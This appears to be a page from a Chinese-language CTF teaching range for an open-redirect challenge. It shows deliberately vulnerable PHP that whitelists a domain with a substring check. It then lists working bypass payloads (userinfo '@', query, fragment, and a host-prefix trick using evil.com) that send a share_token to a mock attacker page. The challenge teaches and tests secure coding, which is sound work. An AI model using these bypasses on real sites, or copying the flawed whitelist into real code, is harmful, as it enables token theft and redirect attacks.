<?php
// ============================================================
// redirect2 · 开放重定向：白名单绕过
// "修复版" jump2.php：要求 URL 里必须出现白名单域名 stars-express.com
// 漏洞：用 strpos 子串匹配（contains）做白名单 —— 可被
//   http://stars-express.com@<host>/catch2.php   (userinfo @)
//   http://<host>/catch2.php?stars-express.com   (query)
//   http://<host>/catch2.php#stars-express.com   (fragment)
// 等方式绕过：字符串里"看得见"白名单域名，浏览器实际连接的却是别的 host
// ============================================================
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>redirect2 · 白名单绕过 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#22d3ee;color:#082f49;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:80%;min-width:260px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
a{color:var(--acc)}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">开放重定向 · 第 2 关</span>
<h1>星桥快递 v2 · 我们加了白名单</h1>
<div class="meta">难度：★★☆☆☆ 进阶 | 关卡 ID：<code>redirect2</code> · 运行时：PHP</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>上一关的漏洞被白帽报告后，程序员"紧急修复"了 <code>jump2.php</code>：现在要求 URL 里<b>必须包含星桥官方域名 <code>stars-express.com</code></b> 才允许跳转，并且跳转时依旧会附上你的 <code>share_token</code>。</p>
<p><a href="jump2.php?url=https://www.stars-express.com/activities" target="_blank">这是一个合法示例：跳去官网活动页</a> —— 能跳。</p>
<p>攻击者服务器（模拟）换到了 <a href="catch2.php" target="_blank"><code>catch2.php</code></a>。目标不变：让 <code>share_token</code> 送到攻击者手里——这次要先骗过白名单。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="jump2.php">
<label>目标 URL：<input type="text" name="url" placeholder="https://www.stars-express.com/..." size="60"></label>
<button type="submit">尝试跳转</button>
</form>
<p style="color:var(--dim);font-size:13px">试试把目标写成攻击者的地址，看会不会被拦；再想想怎么让它"看起来"合法。</p>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p>修复后的核心代码（<code>jump2.php</code>）：</p>
<pre>&lt;?php
$url = $_GET['url'];
// 修复：URL 里必须包含官方域名
if (strpos($url, 'stars-express.com') === false || !preg_match('#^https?://#i', $url)) {
    exit('不允许的跳转目标');
}
header('Location: ' . $url . '?share_token=' . $TOKEN);</pre>
<p>问题出在：<b>对"URL 字符串"做子串匹配，而不是对"URL 结构"里的 host 做精确匹配</b>。</p>
<p>URL 的语法是 <code>scheme://userinfo@host:port/path?query#fragment</code>，其中<b>真正决定浏览器连接到哪台服务器的是 host</b>，其余部分只是"行李"。子串匹配却把整串都当成了判断对象——于是把白名单域名塞进<b>行李</b>里就能过关：</p>
<table>
<tr><th>payload</th><th>包含 stars-express.com？</th><th>浏览器实际访问</th></tr>
<tr><td><code>http://stars-express.com@127.0.0.1/catch2.php</code></td><td>✅（在 userinfo 里）</td><td><code>127.0.0.1/catch2.php</code>（@ 前只是"用户名"）</td></tr>
<tr><td><code>http://127.0.0.1/catch2.php?stars-express.com</code></td><td>✅（在 query 里）</td><td><code>127.0.0.1/catch2.php</code></td></tr>
<tr><td><code>http://127.0.0.1/catch2.php#stars-express.com</code></td><td>✅（在 fragment 里）</td><td><code>127.0.0.1/catch2.php</code>（fragment 都不会发到服务器）</td></tr>
</table>
<p>真实世界里还有同族漏洞：<code>stars-express.com.evil.com</code>（把白名单域当前缀）、反斜杠 <code>https://stars-express.com\@evil.com</code>、大小写与全角字符等。根治办法见文末。</p>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：先验证白名单"看起来"生效</summary><p><code>jump2.php?url=http://127.0.0.1/redirect2/catch2.php</code> 会被拒绝（不含白名单域名）。</p></details>
<details><summary>提示 2：检查只看"字符串里有没有"，不看"出现在 URL 的哪个部位"</summary><p>URL 结构 <code>scheme://userinfo@host/path?query#fragment</code> 里，只有 host 决定连接目标。白名单域名可以出现在 userinfo、query、fragment、甚至 host 的前缀里——检查照样通过。</p></details>
<details><summary>提示 3：payload（三选一）</summary><p>① <code>jump2.php?url=http://stars-express.com@&lt;host&gt;/redirect2/catch2.php</code><br>② <code>jump2.php?url=http://&lt;host&gt;/redirect2/catch2.php?stars-express.com</code><br>③ <code>jump2.php?url=http://&lt;host&gt;/redirect2/catch2.php%23stars-express.com</code><br>跳过去后看攻击者日志里的 share_token。</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../redirect1">← 上一关：redirect1</a><a href="../varcover1">下一关：varcover1 · 变量覆盖 →</a></nav>
<footer>CTF Web 教学式靶场 · F 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=redirect2&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
